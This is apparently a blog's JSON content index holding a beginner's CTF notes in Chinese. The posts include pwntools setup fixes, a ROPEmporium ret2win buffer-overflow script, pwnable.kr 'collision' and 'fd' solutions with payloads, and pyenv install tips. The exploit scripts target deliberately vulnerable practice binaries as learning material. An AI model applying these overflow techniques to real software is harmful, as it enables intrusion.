{"meta":{"title":"192's blog","subtitle":"","description":"","author":192,"url":"http://ftosims.github.io","root":"/"},"pages":[{"title":"404 Not Found","date":"2020-04-10T09:39:13.026Z","updated":"2020-04-10T09:39:13.022Z","comments":true,"path":"404.html","permalink":"http://ftosims.github.io/404.html","excerpt":"","text":"There is N0THlNG4O4~Bye~"},{"title":"关于","date":"2020-04-09T08:16:23.908Z","updated":"2020-04-09T08:16:23.908Z","comments":true,"path":"about/index.html","permalink":"http://ftosims.github.io/about/index.html","excerpt":"","text":"没有什么欲望就像npc一样.jpg"},{"title":"所有分类","date":"2020-04-09T08:13:52.203Z","updated":"2020-04-09T08:13:52.203Z","comments":true,"path":"categories/index.html","permalink":"http://ftosims.github.io/categories/index.html","excerpt":"","text":""},{"title":"Friends","date":"2020-04-09T08:29:26.631Z","updated":"2020-04-09T08:29:26.627Z","comments":true,"path":"friends/index.html","permalink":"http://ftosims.github.io/friends/index.html","excerpt":"","text":""},{"title":"","date":"2020-04-09T08:17:17.929Z","updated":"2020-04-09T08:17:17.929Z","comments":true,"path":"mylist/index.html","permalink":"http://ftosims.github.io/mylist/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2020-04-09T08:14:24.195Z","updated":"2020-04-09T08:14:24.195Z","comments":true,"path":"tags/index.html","permalink":"http://ftosims.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Pwntools的一些坑","slug":"Pwntools 一些坑","date":"2020-04-13T02:22:20.000Z","updated":"2020-04-14T11:39:18.995Z","comments":true,"path":"2020/04/13/Pwntools 一些坑/","link":"","permalink":"http://ftosims.github.io/2020/04/13/Pwntools%20%E4%B8%80%E4%BA%9B%E5%9D%91/","excerpt":"最近刚开始学习pwn，因为看到有python3版本的pwntools。就安了一下，记录一下目前遇到的坑。 _curses moudle not found TypeError：can only concatenate str","text":"最近刚开始学习pwn，因为看到有python3版本的pwntools。就安了一下，记录一下目前遇到的坑。 _curses moudle not found TypeError：can only concatenate str 一、_curses搜索了很多，都是windows下python缺少_curses库的，显然wsl无法用这个方法解决。最后终于找到一个解决方案，链接如下 https://my.oschina.net/leejun2005/blog/167567 针对linux的方案： sudo pip install curses-2048 动态链接库(_curses_panel.so_curses.so)的位置不对或者没有创建动态链接库 123456789101112131415find / -iname \"_curses*.so\" 2&gt;/dev/null/usr/lib64/python2.6/lib-dynload/_curses.so/usr/lib64/python2.6/lib-dynload/_curses_panel.sofind / 2&gt;/dev/null | grep 'python2.7/lib-dynload'|head -2 /opt/soft/python-2.7.11/lib/python2.7/lib-dynload/opt/soft/python-2.7.11/lib/python2.7/lib-dynload/math.socp /usr/lib64/python2.6/lib-dynload/_curses*.so /usr/local/lib/python2.7/lib-dynload/find / -iname \"_curses*.so\" 2&gt;/dev/null/usr/lib64/python2.6/lib-dynload/_curses_panel.so/usr/lib64/python2.6/lib-dynload/_curses.so/usr/local/lib/python2.7/lib-dynload/_curses_panel.so/usr/local/lib/python2.7/lib-dynload/_curses.so 这样就能让python找到相应的so文件。 二、TypeErrorpython3里bytes类型和str类型是两个不同的类型，而不是像py2里面作为同一个类型的两个名字。因此在诸如”A“ * N + p64(Addr)这种形势的payload构造时，会出现问题。 查了好久发现在pwntools github的issue中有一个解答。 对所有要 xx.send()的字符串 要用&#39;latin-1&#39;进行编码。将其变成bytes类型后进行拼接。 最后的结果就是 bytes(&quot;A&quot;, &#39;latin-1&#39;) * N + p64(Addr)","categories":[{"name":"PWN","slug":"PWN","permalink":"http://ftosims.github.io/categories/PWN/"}],"tags":[{"name":"Pwntools","slug":"Pwntools","permalink":"http://ftosims.github.io/tags/Pwntools/"},{"name":"_curses","slug":"curses","permalink":"http://ftosims.github.io/tags/curses/"},{"name":"编码","slug":"编码","permalink":"http://ftosims.github.io/tags/%E7%BC%96%E7%A0%81/"}]},{"title":"这里是一个置顶帖w","slug":"Top","date":"2020-04-13T02:13:12.000Z","updated":"2020-04-14T11:39:18.995Z","comments":true,"path":"2020/04/13/Top/","link":"","permalink":"http://ftosims.github.io/2020/04/13/Top/","excerpt":"基本上是用来做一个todolist的，emmm就这样啦","text":"基本上是用来做一个todolist的，emmm就这样啦 TO-DO Ubuntu 18.04下pwn相关细节 依旧有一些问题没有得到解决 http://homura.cc/blog/archives/168[https://ropemporium.com/guide.html#Common%20pitfalls](https://ropemporium.com/guide.html#Common pitfalls)除了在ROPEmporium ret2win中遇到的跳转函数后遇到的printf处抛出vprintf no such file以外。直接跳转到system等均未出问题。—————20-04-14—————— 对pwn大概路线的了解 Read list https://paper.seebug.org/481/ ret2csu ROPEmporium","categories":[],"tags":[]},{"title":"ROPEmporium ret2win","slug":"ret2win","date":"2020-04-13T02:13:12.000Z","updated":"2020-04-14T11:39:18.995Z","comments":true,"path":"2020/04/13/ret2win/","link":"","permalink":"http://ftosims.github.io/2020/04/13/ret2win/","excerpt":"ret2win整个过程遇到了许多的坑，系统是ubuntu 18.04.","text":"ret2win整个过程遇到了许多的坑，系统是ubuntu 18.04. 题目 https://ropemporium.com/challenge/ret2win.html checksec r2 发现是fgets 可以看出来要ret到这个函数里面 gdb padding应该有40位。 构造相应的payload 123456789101112from pwn import *elf = context.binary = ELF('./ret2win')info('%#x target', elf.symbols.ret2win)io = process(elf.path)# ret2win = p64(elf.symbols.ret2win)payload = \"A\" * 40 + p64(0x400824)io.sendline(payload)flag=io.recvall()success(flag) 一个坑ubuntu18.04下 覆盖的ret地址不能是ret2win的函数开始地址，应该是对应的system地址。 原因好像是18.04在内存对齐上有特殊的要求，等研究好了这里会补充 https://ropemporium.com/guide.html#Common%20pitfalls 问题原理：http://homura.cc/blog/archives/168","categories":[{"name":"PWN","slug":"PWN","permalink":"http://ftosims.github.io/categories/PWN/"}],"tags":[{"name":"ROPEmporium","slug":"ROPEmporium","permalink":"http://ftosims.github.io/tags/ROPEmporium/"},{"name":"ret2win","slug":"ret2win","permalink":"http://ftosims.github.io/tags/ret2win/"}]},{"title":"Pwnalbe.kr C2.collision WP","slug":"Pwnable 2","date":"2020-04-09T09:02:20.000Z","updated":"2020-04-14T11:39:18.995Z","comments":true,"path":"2020/04/09/Pwnable 2/","link":"","permalink":"http://ftosims.github.io/2020/04/09/Pwnable%202/","excerpt":"Pwnalbe.kr C2.collision WP","text":"Pwnalbe.kr C2.collision WP 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123; int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++)&#123; res += ip[i]; &#125; return res;&#125;int main(int argc, char* argv[])&#123; if(argc&lt;2)&#123; printf(\"usage : %s [passcode]\\n\", argv[0]); return 0; &#125; if(strlen(argv[1]) != 20)&#123; printf(\"passcode length should be 20 bytes\\n\"); return 0; &#125; if(hashcode == check_password( argv[1] ))&#123; system(\"/bin/cat flag\"); return 0; &#125; else printf(\"wrong passcode.\\n\"); return 0;&#125; 代码如上 核心思路就是要一个五个字符的passcode。Sum[passcode] = 0x21DD09EC 那么就直接构造4个小的最后再用合减去就有了第五个字符。 payload 1$ ./col `python -c \"print('\\x01\\x01\\x01\\x01'*4+'\\xe8\\x05\\xd9\\x1d')\"` ​","categories":[{"name":"PWN","slug":"PWN","permalink":"http://ftosims.github.io/categories/PWN/"}],"tags":[{"name":"pwnable.kr","slug":"pwnable-kr","permalink":"http://ftosims.github.io/tags/pwnable-kr/"},{"name":"fd","slug":"fd","permalink":"http://ftosims.github.io/tags/fd/"}]},{"title":"Pwnalbe.kr C1.fd WP","slug":"Pwnable fd","date":"2020-04-09T09:02:20.000Z","updated":"2020-04-14T11:39:18.995Z","comments":true,"path":"2020/04/09/Pwnable fd/","link":"","permalink":"http://ftosims.github.io/2020/04/09/Pwnable%20fd/","excerpt":"Pwnalbe.kr C1.fd WP","text":"Pwnalbe.kr C1.fd WP 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123; if(argc&lt;2)&#123; printf(\"pass argv[1] a number\\n\"); return 0; &#125; int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(\"LETMEWIN\\n\", buf))&#123; printf(\"good job :)\\n\"); system(\"/bin/cat flag\"); exit(0); &#125; printf(\"learn about Linux file IO\\n\"); return 0;&#125; 只要让fd = 0 就可以把flag打印到标准输出了。 payload12$ ./fd 4660LETMEWIN","categories":[{"name":"PWN","slug":"PWN","permalink":"http://ftosims.github.io/categories/PWN/"}],"tags":[{"name":"pwnable.kr","slug":"pwnable-kr","permalink":"http://ftosims.github.io/tags/pwnable-kr/"},{"name":"fd","slug":"fd","permalink":"http://ftosims.github.io/tags/fd/"}]},{"title":"Pyenv相关安装问题","slug":"pyenv相关安装问题","date":"2020-04-09T09:02:20.000Z","updated":"2020-04-14T11:39:18.995Z","comments":true,"path":"2020/04/09/pyenv相关安装问题/","link":"","permalink":"http://ftosims.github.io/2020/04/09/pyenv%E7%9B%B8%E5%85%B3%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98/","excerpt":"pyenv相关安装问题1. pyenv install 下载慢1. 代理命令行可以用proxychains-ng 2. ~/.pyenv/cache将要安装的版本的.gz包从官网下载之后放进~/.pyenv/cache再pyenv install就可以安装了","text":"pyenv相关安装问题1. pyenv install 下载慢1. 代理命令行可以用proxychains-ng 2. ~/.pyenv/cache将要安装的版本的.gz包从官网下载之后放进~/.pyenv/cache再pyenv install就可以安装了 2. 依赖ubuntu1234sudo apt-get updatesudo apt-get install make build-essential libssl-dev zlib1g-devsudo apt-get install libbz2-dev libreadline-dev libsqlite3-dev wget curlsudo apt-get install llvm libncurses5-dev libncursesw5-dev","categories":[{"name":"config","slug":"config","permalink":"http://ftosims.github.io/categories/config/"}],"tags":[{"name":"pyenv","slug":"pyenv","permalink":"http://ftosims.github.io/tags/pyenv/"}]}],"categories":[{"name":"PWN","slug":"PWN","permalink":"http://ftosims.github.io/categories/PWN/"},{"name":"config","slug":"config","permalink":"http://ftosims.github.io/categories/config/"}],"tags":[{"name":"Pwntools","slug":"Pwntools","permalink":"http://ftosims.github.io/tags/Pwntools/"},{"name":"_curses","slug":"curses","permalink":"http://ftosims.github.io/tags/curses/"},{"name":"编码","slug":"编码","permalink":"http://ftosims.github.io/tags/%E7%BC%96%E7%A0%81/"},{"name":"ROPEmporium","slug":"ROPEmporium","permalink":"http://ftosims.github.io/tags/ROPEmporium/"},{"name":"ret2win","slug":"ret2win","permalink":"http://ftosims.github.io/tags/ret2win/"},{"name":"pwnable.kr","slug":"pwnable-kr","permalink":"http://ftosims.github.io/tags/pwnable-kr/"},{"name":"fd","slug":"fd","permalink":"http://ftosims.github.io/tags/fd/"},{"name":"pyenv","slug":"pyenv","permalink":"http://ftosims.github.io/tags/pyenv/"}]}